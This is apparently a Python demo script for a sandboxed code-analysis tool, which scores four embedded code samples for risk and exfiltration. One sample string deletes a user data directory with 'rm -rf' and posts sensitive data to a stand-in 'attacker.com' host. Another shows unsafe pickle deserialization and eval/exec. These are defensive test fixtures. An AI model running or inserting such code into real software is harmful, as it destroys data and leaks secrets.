#!/usr/bin/env python3
"""Demonstration of the Sandboxed Code Detonation System."""

import asyncio
import sys
sys.path.insert(0, 'src')

from loom.tools import sandbox

# Example 1: Completely safe code
SAFE_CODE = """
def calculate_sum(a, b):
    '''Add two numbers.'''
    return a + b

result = calculate_sum(5, 3)
print(result)
"""

# Example 2: Suspicious code with file operations
SUSPICIOUS_CODE = """
import os

def read_config():
    with open('/etc/config.txt', 'r') as f:
        return f.read()

config = read_config()
"""

# Example 3: Dangerous code with shell execution
DANGEROUS_CODE = """
import subprocess
import requests

# Execute shell command
subprocess.run(['rm', '-rf', '/home/user/data'])

# Exfiltrate data
response = requests.post(
    'http://attacker.com/exfil',
    json={'sensitive_data': secret_value}
)
"""

# Example 4: Critical code with code execution
CRITICAL_CODE = """
import pickle

# Unsafe deserialization
user_data = pickle.loads(untrusted_input)

# Code execution
eval(user_data.get('command'))
exec(compile_from_user())
"""


async def main():
    examples = [
        ("SAFE CODE", SAFE_CODE),
        ("SUSPICIOUS CODE", SUSPICIOUS_CODE),
        ("DANGEROUS CODE", DANGEROUS_CODE),
        ("CRITICAL CODE", CRITICAL_CODE),
    ]

    for title, code in examples:
        print(f"\n{'='*70}")
        print(f"EXAMPLE: {title}")
        print(f"{'='*70}\n")
        
        # Analyze
        analysis = await sandbox.research_sandbox_analyze(code)
        
        print(f"Code:\n{code}\n")
        print(f"Results:")
        print(f"  Risk Score:     {analysis['risk_score']}/10")
        print(f"  Classification: {analysis['classification'].upper()}")
        print(f"  Safe to Execute: {analysis['safe_to_execute']}")
        print(f"  Syntax Valid:   {analysis['syntax_valid']}")
        
        if analysis['dangerous_patterns']:
            print(f"\n  Dangerous Patterns ({len(analysis['dangerous_patterns'])}):")
            for pattern in analysis['dangerous_patterns'][:5]:
                print(f"    - Line {pattern['line']}: {pattern['description']}")
        
        if analysis['exfiltration_vectors']:
            print(f"\n  Exfiltration Vectors ({len(analysis['exfiltration_vectors'])}):")
            for exfil in analysis['exfiltration_vectors'][:3]:
                print(f"    - {exfil['description']}")
        
        # Generate report for dangerous code
        if analysis['risk_score'] > 3:
            print(f"\n  Security Report:")
            report = await sandbox.research_sandbox_report(code, context="demo")
            for i, rec in enumerate(report['recommendations'], 1):
                print(f"    {i}. {rec}")


if __name__ == '__main__':
    asyncio.run(main())
